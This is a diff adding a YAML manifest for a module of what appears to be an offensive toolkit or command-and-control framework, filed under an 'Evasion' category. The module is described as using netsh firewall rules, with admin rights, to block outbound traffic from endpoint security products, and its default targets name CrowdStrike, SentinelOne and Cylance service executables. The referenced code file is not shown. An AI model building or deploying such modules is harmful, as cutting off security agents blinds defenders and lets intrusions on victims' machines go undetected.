@@ -1,0 +1,46 @@
+module:
+  id: deny_outbound_firewall
+  version: "1.0.0"
+  display_name: "Deny Outbound Firewall"
+  description: "Block EDR/security tools from making outbound connections (requires Admin)"
+
+  requires: []
+
+  provides:
+    - DenyOutboundFirewall
+
+  files:
+    - code.ahk
+
+  dispatch:
+    DenyOutboundFirewall: DenyOutboundFirewall
+
+  schema:
+    category_id: evasion
+    category_name: "Evasion"
+    modules:
+      deny_outbound_firewall:
+        display_name: "Deny Outbound Firewall"
+        description: "Block outbound traffic through netsh for targeted executable names"
+        command_template: "execute_module|DenyOutboundFirewall|{target_files}"
+        parameters:
+          target_files:
+            type: textarea
+            display_name: "Target Files"
+            description: "Not case sensitive, comma separated list only"
+            required: true
+            default: "csfalconservice, sentinelone, cylancesvc, SEDservice"
+            validation:
+              min_length: 1
+              max_length: 1024
+        documentation:
+          content: "Blocks outbound traffic through netsh for targeted executable names found in Program Files."
+          examples:
+            - "csfalconservice, sentinelone, cylancesvc"
+        execution:
+          timeout: 300
+          requires_admin: true
+        ui:
+          layout: simple
+
+  config_options: {}
